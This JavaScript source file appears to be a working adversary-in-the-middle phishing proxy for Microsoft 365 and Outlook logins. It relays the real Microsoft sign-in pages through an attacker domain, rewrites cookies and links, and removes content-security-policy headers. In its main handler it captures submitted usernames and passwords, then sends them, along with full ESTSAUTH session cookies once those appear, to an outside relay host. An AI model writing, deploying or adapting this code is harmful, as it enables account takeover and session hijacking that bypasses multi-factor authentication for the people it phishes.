export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Critical auth cookies that must be present for session to work
const CRITICAL_AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function isOurDomain(domain) {
  if (!domain) return false;
  return domain === YOUR_DOMAIN || domain.endsWith('.' + YOUR_DOMAIN);
}

// ==================== FIXED URL PARSER - NO DUPLICATE PARAMETERS ====================

function cleanAndMergeSearchParams(originalSearch, pathExtractedParams) {
  // Parse original search params
  const originalParams = new URLSearchParams(originalSearch);
  const pathParams = new URLSearchParams(pathExtractedParams);
  
  // Merge params, giving priority to path params (they come from the original URL structure)
  const mergedParams = new URLSearchParams();
  
  // First add all original params
  for (const [key, value] of originalParams) {
    if (key !== 'path') { // Skip 'path' param from original
      mergedParams.set(key, value);
    }
  }
  
  // Then add/override with path params
  for (const [key, value] of pathParams) {
    mergedParams.set(key, value);
  }
  
  const result = mergedParams.toString();
  return result ? '?' + result : '';
}

function parseUrl(url) {
  // Extract pathname and search
  let pathname = url.pathname;
  let search = url.search || '';
  
  // Remove leading slash
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  // Check for _p/ pattern
  if (path.startsWith('_p/')) {
    const parts = path.split('/');
    if (parts.length >= 2) {
      const domain = parts[1];
      
      // Get the remaining path after domain
      let remainingPath = '';
      let queryParamsFromPath = '';
      
      if (parts.length > 2) {
        // Check if any part contains query parameters
        const remainingParts = [];
        for (let i = 2; i < parts.length; i++) {
          if (parts[i].includes('?')) {
            // This part has query parameters
            const [pathPart, queryPart] = parts[i].split('?');
            if (pathPart) remainingParts.push(pathPart);
            if (queryPart) queryParamsFromPath = queryPart;
          } else {
            remainingParts.push(parts[i]);
          }
        }
        remainingPath = remainingParts.length ? '/' + remainingParts.join('/') : '/';
      } else {
        remainingPath = '/';
      }
      
      // Clean up the search parameters by merging
      const finalSearch = cleanAndMergeSearchParams(search, queryParamsFromPath);
      
      if (!isOurDomain(domain) && IDENTITY_PROVIDERS[domain]) {
        return {
          upstream: domain,
          type: IDENTITY_PROVIDERS[domain].type,
          path: remainingPath,
          search: finalSearch
        };
      }
    }
  }
  
  // Check if the path contains a domain to proxy
  for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
    if (path.includes(domain)) {
      const domainIndex = path.indexOf(domain);
      const afterDomain = path.substring(domainIndex + domain.length);
      return {
        upstream: domain,
        type: IDENTITY_PROVIDERS[domain].type,
        path: afterDomain || '/',
        search: cleanAndMergeSearchParams(search, '')
      };
    }
  }
  
  // Default to Microsoft login
  return {
    upstream: 'login.microsoftonline.com',
    type: 'microsoft',
    path: pathname,
    search: cleanAndMergeSearchParams(search, '')
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  return !!IDENTITY_PROVIDERS[hostname] || 
         hostname.includes('microsoft') || 
         hostname.includes('live.com') ||
         hostname.includes('office.com');
}

// ==================== SIMPLE LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  if (!location) return location;
  
  try {
    // Handle relative URLs
    if (location.startsWith('/')) {
      return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${location}`;
    }
    
    const url = new URL(location);
    
    // If it's already our domain, ensure proper format
    if (isOurDomain(url.hostname)) {
      if (!url.pathname.startsWith('/_p/')) {
        return `https://${YOUR_DOMAIN}/_p/${currentUpstream}${url.pathname}${url.search}`;
      }
      return location;
    }
    
    // Proxy external domains
    if (shouldProxyDomain(url.hostname)) {
      // CRITICAL: Don't duplicate the path parameter
      let search = url.search;
      if (search && search.includes('path=')) {
        const params = new URLSearchParams(search);
        params.delete('path');
        search = params.toString();
        search = search ? '?' + search : '';
      }
      return `https://${YOUR_DOMAIN}/_p/${url.hostname}${url.pathname}${search}`;
    }
    
    return location;
  } catch (e) {
    // If URL parsing fails, return as-is
    return location;
  }
}

// ==================== AUTH DETECTION ====================

function hasCompleteAuthSession(cookieStr) {
  if (!cookieStr) return false;
  const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth=');
  const hasESTSAUTHPERSISTENT = cookieStr.toLowerCase().includes('estsauthpersistent=');
  return hasESTSAUTH && hasESTSAUTHPERSISTENT;
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    // Try JSON
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  // Try form data (Microsoft login)
  try {
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username');
    pass = params.get('passwd') || params.get('password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

// ==================== COOKIE HANDLING ====================

function getRequestCookies(request, upstreamDomain) {
  const cookieHeader = request.headers.get('cookie');
  if (!cookieHeader) return null;
  
  // Replace our domain with the upstream domain in cookie values
  let modifiedCookies = cookieHeader;
  const ourDomainRegex = new RegExp(YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
  modifiedCookies = modifiedCookies.replace(ourDomainRegex, upstreamDomain);
  
  return modifiedCookies;
}

function processResponseCookies(cookies, upstreamDomain, ourDomain) {
  const modifiedCookies = [];
  
  for (const cookie of cookies) {
    if (!cookie) continue;
    
    // Simple domain replacement
    let modifiedCookie = cookie;
    
    // Replace domain attribute
    modifiedCookie = modifiedCookie.replace(
      new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'), 
      ourDomain
    );
    
    // Replace domain with leading dot
    modifiedCookie = modifiedCookie.replace(
      new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g'), 
      '.' + ourDomain
    );
    
    modifiedCookies.push(modifiedCookie);
  }
  
  return modifiedCookies;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = parseUrl(url);
  const upstreamUrl = `https://${info.upstream}${info.path}${info.search}`;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Prepare request headers
  const headers = new Headers();
  
  // Copy essential client headers
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin'];
  for (const h of clientHeaders) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }

  // Forward cookies properly
  const forwardedCookies = getRequestCookies(request, info.upstream);
  if (forwardedCookies) {
    headers.set('cookie', forwardedCookies);
  }

  // Set required headers
  headers.set('Host', info.upstream);
  headers.set('Referer', `https://${url.hostname}/`);
  headers.set('Origin', `https://${info.upstream}`);

  // Remove problematic headers
  const removeHeaders = ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
                         'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'];
  for (const h of removeHeaders) {
    headers.delete(h);
  }

  let requestBody = null;

  // Handle POST requests for credentials
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user.substring(0, 5)}...`);
        await sendToVercel('credentials', { 
          type: 'creds', ip, user, pass, platform: info.type, url: url.href 
        });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const location = resp.headers.get('Location');
      if (location) {
        const rewrittenLocation = rewriteLocation(location, info.upstream);
        console.log(`[REDIRECT] ${resp.status} -> ${rewrittenLocation}`);
        
        const redirectHeaders = new Headers();
        redirectHeaders.set('location', rewrittenLocation);
        redirectHeaders.set('access-control-allow-origin', '*');
        redirectHeaders.set('access-control-allow-credentials', 'true');
        
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Get cookies from response
    const responseCookies = resp.headers.getSetCookie?.() || [];
    
    // Check for complete session
    if (responseCookies.length) {
      const allCookiesStr = responseCookies.join('; ');
      const hasCompleteSession = hasCompleteAuthSession(allCookiesStr);
      
      if (hasCompleteSession) {
        console.log(`[EXFIL] Complete session captured`);
        await exfiltrateCookies(allCookiesStr, ip, info.type, url.href);
      }
    }

    // Process cookies for browser
    const modifiedCookies = processResponseCookies(responseCookies, info.upstream, url.hostname);

    // Build response headers
    const responseHeaders = new Headers();
    
    // Copy important headers
    const copyHeaders = ['content-type', 'content-length', 'content-encoding', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
    for (const name of copyHeaders) {
      const value = resp.headers.get(name);
      if (value) responseHeaders.set(name, value);
    }
    
    // Remove security headers
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    
    // Add CORS headers
    responseHeaders.set('access-control-allow-origin', '*');
    responseHeaders.set('access-control-allow-credentials', 'true');
    
    // Add modified cookies
    for (const cookie of modifiedCookies) {
      responseHeaders.append('set-cookie', cookie);
    }

    // Process response body
    const contentType = resp.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || contentType.includes('application/javascript') || 
        contentType.includes('application/json') || contentType.includes('text/css')) {
      
      let text = await resp.text();
      
      // Simple domain replacement
      for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
        const regex = new RegExp(domain.replace(/\./g, '\\.'), 'g');
        text = text.replace(regex, `${YOUR_DOMAIN}/_p/${domain}`);
      }
      
      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }), 
      { status: 502, headers: { 'content-type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
